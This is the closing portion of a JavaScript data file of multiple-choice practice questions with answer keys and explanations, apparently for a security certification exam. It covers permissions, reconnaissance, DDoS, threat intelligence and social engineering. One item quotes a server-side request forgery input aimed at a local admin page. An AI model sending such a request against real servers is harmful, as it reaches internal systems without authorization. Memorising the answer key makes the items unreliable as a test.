      "explanation": "This is a 'bug bounty'. Many big companies will pay a reward, or 'bounty', to ethical hackers who find and report security holes ('bugs') in their products. It's a way of encouraging people to help them find problems before the real baddies do. It's not a ransom, because the company is paying willingly as a reward."
    },
    {
      "question": "177. Charles sets the permissions on the /etc directory on a Linux system to 777 using the chmod command. If Alex later discovers this, what should he report his finding as?",
      "correct_answer": "A. Open or weak permissions",
      "incorrect_answers": [
        "B. Improper file handling",
        "C. A privilege escalation attack",
        "D. None of the above"
      ],
      "explanation": "This is a classic case of 'open or weak permissions'. On Linux, '777' means that absolutely everyone has full permission to read, write, and execute files in that directory. The `/etc` directory contains lots of important system configuration files, so leaving it wide open like this is a massive security mistake."
    },
    {
      "question": "178. During a penetration test, Kathleen gathers information, including the organization's domain name, IP addresses, employee information, phone numbers, email addresses, and similar data. What is this process typically called?",
      "correct_answer": "B. Footprinting",
      "incorrect_answers": [
        "A. Mapping",
        "C. Fingerprinting",
        "D. Aggregation"
      ],
      "explanation": "This information gathering stage is called 'footprinting'. Kathleen is trying to build a complete picture, or 'footprint', of the organisation's presence on the internet. It's the first step in most hacking attempts, where you gather as much information as possible before you start trying to break in."
    },
    {
      "question": "179. What term describes mapping wireless networks while driving?",
      "correct_answer": "C. War driving",
      "incorrect_answers": [
        "A. Wi-driving",
        "B. Traffic testing",
        "D. CARINT"
      ],
      "explanation": "This is called 'war driving'. It's a term that's been around for a long time. It involves driving (or walking) around with a laptop and special software to detect and map out all the Wi-Fi networks in an area. It helps attackers (and security testers) find weak or open networks to target."
    },
    {
      "question": "180. Fred discovers that the lighting and utility control systems for his company have been overwhelmed by traffic sent to them from hundreds of external network hosts. This has resulted in the lights and utility system management systems not receiving appropriate reporting, and the endpoint devices cannot receive commands. What type of attack is this?",
      "correct_answer": "B. An operational technology (OT) DDoS",
      "incorrect_answers": [
        "A. A SCADA overflow",
        "C. A network DDoS",
        "D. An application DDoS"
      ],
      "explanation": "This is a DDoS attack on 'Operational Technology' (OT). OT refers to the computers that control physical things in the real world, like power grids, factory machines, and in this case, lighting systems. Attacking these systems can cause real-world chaos, which is much scarier than just taking a website offline."
    },
    {
      "question": "181. Ben runs a vulnerability scan using up-to-date definitions for a system that he knows has a vulnerability in the version of Apache that it is running. The vulnerability scan does not show that issue when he reviews the report. What has Ben encountered?",
      "correct_answer": "C. A false negative",
      "incorrect_answers": [
        "A. A silent patch",
        "B. A missing vulnerability update",
        "D. A false positive"
      ],
      "explanation": "Ben has encountered a 'false negative'. This is the opposite of a 'false positive' and is much more dangerous. It's when the security scanner *misses* a real problem. Ben knows there's a security hole, but the scanner is telling him everything is fine. This can give a false sense of security."
    },
    {
      "question": "182. What type of technique is commonly used by malware creators to change the signature of malware to avoid detection by antivirus tools?",
      "correct_answer": "A. Refactoring",
      "incorrect_answers": [
        "B. Cloning",
        "C. Manual source code editing",
        "D. Changing programming languages"
      ],
      "explanation": "This technique is often called 'refactoring' or 'polymorphism'. The malware automatically changes its own code slightly every time it copies itself. This changes its 'signature' (like a fingerprint), making it much harder for antivirus software, which looks for known signatures, to spot it. It's like a criminal constantly changing their appearance to avoid being recognised."
    },
    {
      "question": "183. What term describes a military strategy for political warfare that combines conventional warfare, irregular warfare, and cyberwarfare with fake news, social media influence strategies, diplomatic efforts, and manipulation of legal activities?",
      "correct_answer": "B. Hybrid warfare",
      "incorrect_answers": [
        "A. Social warfare",
        "C. Social influence",
        "D. Cybersocial influence campaigns"
      ],
      "explanation": "This is called 'hybrid warfare'. It's a modern type of conflict where a country doesn't just use soldiers and tanks. They also use cyberattacks, fake news, and political and economic pressure all at the same time. It's a 'hybrid' of different methods, all working together to achieve a goal without necessarily starting an all-out traditional war."
    },
    {
      "question": "184. Chris is notified that one of his staff was warned via a text message that the FBI is aware that they have accessed illegal websites. What type of issue is this?",
      "correct_answer": "C. A hoax",
      "incorrect_answers": [
        "A. A phishing attempt",
        "B. Identity fraud",
        "D. An invoice scam"
      ],
      "explanation": "This is a 'hoax'. It's a fake story designed to scare people. The FBI doesn't usually send text messages like this. While it might be part of a phishing attempt to get the person to call a number or click a link, the story itself is a complete fabrication, or hoax."
    },
    {
      "question": "185. Sarah is reviewing the logs for her web server and sees an entry flagged for review that includes the following HTTP request:\nCheckinstockAPI=http://localhost/admin.php\nWhat type of attack is most likely being attempted?",
      "correct_answer": "B. Server-side request forgery",
      "incorrect_answers": [
        "A. A cross-site scripting attack",
        "C. Client-side request forgery",
        "D. SQL injection"
      ],
      "explanation": "This is a 'Server-Side Request Forgery' (SSRF) attack. The attacker is trying to trick the web server into making a request to itself ('localhost'). They're hoping that the server has special access to internal pages, like 'admin.php', that aren't available to the public. The server is being 'forged' into making a request on the attacker's behalf."
    },
    {
      "question": "186. Angela reviews bulletins and advisories to determine what threats her organization is likely to face. What type of activity is this associated with?",
      "correct_answer": "B. Threat hunting",
      "incorrect_answers": [
        "A. Incident response",
        "C. Penetration testing",
        "D. Vulnerability scanning"
      ],
      "explanation": "Angela is doing 'threat hunting'. Instead of just waiting for an alarm to go off, a threat hunter proactively looks for signs of trouble. This includes reading up on the latest attack methods ('bulletins and advisories') and then actively searching their own network for any clues that those attacks might be happening."
    },
    {
      "question": "187. Why do attackers target passwords stored in memory?",
      "correct_answer": "C. They are often in plain text.",
      "incorrect_answers": [
        "A. They are encrypted in memory.",
        "B. They are hashed in memory.",
        "D. They are often de-hashed for use."
      ],
      "explanation": "Even if passwords are stored securely on the hard drive, they often have to be held in the computer's short-term memory ('RAM') in 'plain text' while they are being used. If an attacker can get access to the computer's memory, they can often just read the password right out. It's a major reason why it's so important to keep malware off your machine."
    },
    {
      "question": "188. The U.S. Department of Homeland Security (DHS) provides an automated indicator sharing (AIS) service that allows for the federal government and private sector organizations to share threat data in real time. The AIS service uses open source protocols and standards to exchange this information. Which of the following standards does the AIS service use?",
      "correct_answer": "D. STIX and TAXII",
      "incorrect_answers": [
        "A. HTML and HTTPS",
        "B. SFTP and XML",
        "C. STIX and TRIX"
      ],
      "explanation": "The correct answer here is 'STIX and TAXII'. These are two standards designed specifically for sharing threat information. 'STIX' is the language used to describe the threats (like 'this is a bad IP address'). 'TAXII' is the protocol used to transport that information from one security tool to another. It's like the envelope and the language of the letter inside."
    },
    {
      "question": "189. During what phase of a penetration test is information like employee names, phone number, and email addresses gathered?",
      "correct_answer": "C. Reconnaissance",
      "incorrect_answers": [
        "A. Exploitation",
        "B. Establishing persistence",
        "D. Lateral movement"
      ],
      "explanation": "This information gathering happens during the 'reconnaissance' phase. This is the first stage of any attack or penetration test. The goal is to learn as much as possible about the target before you do anything else. This often involves a lot of 'OSINT' (Open-Source Intelligence) to find public information like employee names and email addresses."
    },
    {
      "question": "190. During a penetration test, Angela obtains the uniform of a well-known package delivery service and wears it into the target office. She claims to have a delivery for a C-level employee she knows is there and insists that the package must be signed for by that person. What social engineering technique has she used?",
      "correct_answer": "A. Impersonation",
      "incorrect_answers": [
        "B. Whaling",
        "C. A watering hole attack",
        "D. Prepending"
      ],
      "explanation": "Angela is using 'impersonation'. By putting on the uniform, she is pretending to be someone she's not – a delivery driver. People tend to automatically trust someone in a uniform, so it's a very effective way to get past reception and gain physical access to a building."
    },
    {
      "question": "191. Nick purchases his network devices through a gray market supplier that imports them into his region without an official relationship with the network device manufacturer. What risk should Nick identify when he assesses his supply chain risk?",
      "correct_answer": "D. All of the above",
      "incorrect_answers": [
        "A. Lack of vendor support",
        "B. Lack of warranty coverage",
        "C. Inability to validate the source of the devices"
      ],
      "explanation": "Buying from the 'grey market' is risky for all these reasons. You won't get any official support or warranty from the manufacturer. Even worse, you can't be sure where the devices really came from. They could be stolen, refurbished, or even have malicious hardware or software installed on them. It's a big 'supply chain' risk."
    },
    {
      "question": "192. Christina wants to identify indicators of attack for XML-based web applications that her organization runs. Where is she most likely to find information that can help her determine whether XML injection is occurring against her web applications?",
      "correct_answer": "B. Web server logs",
      "incorrect_answers": [
        "A. Syslog",
        "C. Authentication logs",
        "D. Event logs"
      ],
      "explanation": "The best place to look is the 'web server logs'. XML injection attacks work by sending dodgy, specially-crafted requests to the web server. The web server keeps a log of every single request it receives, so by looking through these logs, Christina can spot the unusual requests that indicate an attacker is trying to perform an XML injection."
    },
    {
      "question": "193. What can Frank do to determine if he is suffering from a denial-of-service (DoS) attack against his cloud hosting environment?",
      "correct_answer": "C. Review the cloud service provider's security tools and enable logging and anti-DoS tools if they exist.",
      "incorrect_answers": [
        "A. Nothing; cloud services do not provide security tools.",
        "B. Call the cloud service provider to have them stop the DoS attack.",
        "D. Call the cloud service provider's Internet service provider (ISP) and ask them to enable DoS prevention."
      ],
      "explanation": "Frank's best bet is to use the tools his cloud provider gives him. Major cloud services like Amazon Web Services or Microsoft Azure have built-in security tools and logging that can help detect and even automatically block DoS attacks. He just needs to make sure he's enabled them and knows how to check the reports."
    },
    {
      "question": "194. Frank is using the cloud hosting service's web publishing service rather than running his own web servers. Where will Frank need to look to review his logs to see what types of traffic his application is creating?",
      "correct_answer": "C. The cloud service's web logs",
      "incorrect_answers": [
        "A. Syslog",
        "B. Apache logs",
        "D. None of the above"
      ],
      "explanation": "Since Frank is using a service where the cloud provider manages the web server for him (like a 'Platform as a Service'), he won't have access to the server's own system logs. Instead, he'll need to use the logging and monitoring tools provided by the cloud service itself to see what's going on."
    },
    {
      "question": "195. If Frank were still operating in his on-site infrastructure, which of the following technologies would provide the most insight into what type of attack he was seeing?",
      "correct_answer": "B. An IPS",
      "incorrect_answers": [
        "A. A firewall",
        "C. A vulnerability scanner",
        "D. Antimalware software"
      ],
      "explanation": "An 'IPS' (Intrusion Prevention System) would be the most helpful here. A firewall just blocks or allows traffic, but an IPS is smarter. It inspects the traffic and can identify specific attack patterns, like a DoS attack. It can then not only alert Frank but also actively block the malicious traffic."
    },
    {
      "question": "196. Alaina wants to ensure that the on-site system integration that a vendor that her company is working with is done in accordance with industry best practices. Which of the following is not a common method of ensuring this?",
      "correct_answer": "D. Requiring an SOC report",
      "incorrect_answers": [
        "A. Inserting security requirements into contracts",
        "B. Auditing configurations",
        "C. Coordinating with the vendor for security reviews during and after installation"
      ],
      "explanation": "An SOC report is something you'd ask for from a *service* provider, like a company that hosts your data for you. It's an audit of *their* security controls. For a vendor who is just coming on-site to install equipment, it's more important to have clear security rules in the contract, and to do your own audits and security reviews of the work they're doing."
    },
    {
      "question": "197. Elias has implemented an AI-based network traffic analysis tool that requires him to allow the tool to monitor his network for a period of two weeks before being put into full production. What is the most significant concern he needs to address before using the AI's baselining capabilities?",
      "correct_answer": "B. Compromised or otherwise malicious machines could be added to the baseline resulting in tainted training data.",
      "incorrect_answers": [
        "A. The network should be isolated to prevent outbound traffic from being added to the normal traffic patterns.",
        "C. Traffic patterns may not match traffic throughout a longer timeframe.",
        "D. The AI may not understand the traffic flows in his network."
      ],
      "explanation": "The biggest danger is 'tainted training data'. The AI tool learns what is 'normal' for the network during this two-week training period. If there's already a hacker or a virus on the network during that time, the AI will learn that the malicious activity is 'normal'. This means it won't raise an alarm when it sees it in the future, making the tool useless."
    },
    {
      "question": "198. What is the typical goal intent or goal of hacktivists?",
      "correct_answer": "C. Making a political statement",
      "incorrect_answers": [
        "A. Increasing their reputation",
        "B. Financial gain",
        "D. Gathering high-value data"
      ],
      "explanation": "'Hacktivists' are hackers with a cause. They're not usually in it for the money. Their main goal is to make a political or social statement. They might do this by defacing a website, leaking embarrassing documents, or taking a service offline to protest something they disagree with."
    },
    {
      "question": "199. Where does the information for predictive analysis for threat intelligence come from?",
      "correct_answer": "D. All of the above",
      "incorrect_answers": [
        "A. Current security trends",
        "B. Large security datasets",
        "C. Behavior patterns"
      ],
      "explanation": "'Predictive analysis' is like trying to predict the future of cyberattacks. To do this, these clever tools look at everything: massive datasets from past attacks, current trends in what hackers are doing, and the normal behaviour patterns on a network. By combining all this information, they try to predict where the next attack is most likely to come from."
    },
    {
      "question": "200. Social Security numbers and other personal information are often stolen for what purpose?",
      "correct_answer": "C. Identity fraud",
      "incorrect_answers": [
        "A. Blackmail",
        "B. Tailgating",
        "D. Impersonation"
      ],
      "explanation": "The number one reason for stealing this kind of personal data is 'identity fraud'. With your name, address, and Social Security number, a criminal can pretend to be you. They can open bank accounts, take out loans, or get credit cards in your name, leaving you with a massive mess to clean up."
    }
  ]
}

export const questions = [...sets.set1, ...sets.set2];

    
    